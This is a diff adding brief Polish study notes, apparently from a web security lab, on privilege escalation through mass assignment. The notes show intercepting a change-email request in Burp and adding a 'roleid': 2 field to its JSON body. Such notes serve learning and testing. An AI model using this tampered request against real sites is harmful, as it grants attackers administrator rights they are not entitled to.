@@ -1,0 +1,19 @@
+Serwer pozwala użytkownikowi samemu modyfikować swoje uprawnienia przez parametr w requeście który powinien być tylko po stronie serwera.
+
+
+MÓJ CZESTY BLAD. JSON WYMAGA PRZECINKA MIEDZY QUERY
+
+1. burp proxy > szukam /change email
+2. nadpisuje json:
+przed:
+POST /my-account/change-email
+{
+  "email": "test@test.com"
+}
+
+po:
+POST /my-account/change-email
+{
+  "email": "test@test.com",
+  "roleid": 2
+}
